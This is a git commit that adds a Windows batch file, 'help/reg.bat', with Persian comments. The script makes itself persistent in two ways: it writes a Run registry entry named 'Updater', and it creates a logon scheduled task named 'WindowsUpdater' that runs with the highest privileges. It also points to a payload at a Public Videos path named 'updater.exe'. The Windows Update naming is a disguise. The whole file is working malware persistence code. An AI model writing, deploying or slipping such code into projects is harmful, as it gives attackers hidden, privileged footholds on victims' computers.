22821da58bdf51a99982ef3eca1e72b4bcc2190b
Amir Mahdi Zare <83335541+amir13872@users.noreply.github.com>
2025-03-07 16:27:42 +0330

    Create reg.bat

---
+++ help/reg.bat
@@ -0,0 +1,9 @@
+@echo off
+set payloadPath=C:\Users\Public\Videos\updater.exe
+set taskName=WindowsUpdater
+
+:: اضافه کردن به استارت‌آپ (Registry)
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "%~f0" /f
+
+:: ایجاد Scheduled Task برای اجرای بات‌فایل پس از هر ری‌استارت
+schtasks /create /sc onlogon /tn %taskName% /tr "%~f0" /f /rl highest
